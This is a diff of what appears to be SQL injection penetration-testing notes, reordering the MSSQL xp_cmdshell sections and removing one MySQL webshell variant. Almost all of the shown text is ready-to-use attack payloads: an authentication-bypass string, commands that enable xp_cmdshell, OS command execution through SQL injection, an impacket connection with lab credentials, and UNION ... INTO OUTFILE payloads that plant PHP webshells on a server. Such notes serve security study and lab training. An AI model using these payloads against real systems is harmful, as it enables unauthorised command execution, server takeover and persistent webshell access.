@@ -239,28 +239,6 @@ admin' OR 'a'='a'-- //           -- String comparison bypass
 **Prerequisites**: Administrator privileges, xp_cmdshell enabled
 **Function**: Executes Windows shell commands through SQL
 
-#### Enable xp_cmdshell
-```sql
--- Enable advanced options
-EXECUTE sp_configure 'show advanced options', 1;
-RECONFIGURE;
-
--- Enable xp_cmdshell
-EXECUTE sp_configure 'xp_cmdshell', 1;
-RECONFIGURE;
-```
-
-#### Execute Commands
-```sql
--- Basic command execution
-EXECUTE xp_cmdshell 'whoami';
-EXECUTE xp_cmdshell 'dir C:\';
-EXECUTE xp_cmdshell 'net user';
-
--- SQLi payload with xp_cmdshell
-' UNION SELECT null, null, null, null; EXEC xp_cmdshell 'whoami'-- //
-```
-
 #### Connection & Execution Example
 ```bash
 # Connect to MSSQL
@@ -270,6 +248,16 @@ impacket-mssqlclient Administrator:Lab123@192.168.50.18 -windows-auth
 SQL> EXECUTE sp_configure 'show advanced options', 1; RECONFIGURE;
 SQL> EXECUTE sp_configure 'xp_cmdshell', 1; RECONFIGURE;
 SQL> EXECUTE xp_cmdshell 'whoami';
+```
+#### Execute Commands
+```sql
+-- Basic command execution
+EXECUTE xp_cmdshell 'whoami';
+EXECUTE xp_cmdshell 'dir C:\';
+EXECUTE xp_cmdshell 'net user';
+
+-- SQLi payload with xp_cmdshell
+' UNION SELECT null, null, null, null; EXEC xp_cmdshell 'whoami'-- //
 ```
 
 ### MySQL - INTO OUTFILE
@@ -282,10 +270,6 @@ SQL> EXECUTE xp_cmdshell 'whoami';
 -- Basic webshell creation
 ' UNION SELECT "<?php system($_GET['cmd']);?>", null, null, null, null 
   INTO OUTFILE "/var/www/html/tmp/webshell.php"-- //
-
--- Alternative webshell
-' UNION SELECT "<?php system($_REQUEST['cmd']); ?>", null, null, null, null 
-  INTO OUTFILE "/var/www/html/shell.php"-- //
 
 -- Advanced webshell with error handling
 ' UNION SELECT "<?php if(isset($_GET['cmd'])){echo '<pre>'.shell_exec($_GET['cmd']).'</pre>';} ?>", null, null, null, null 
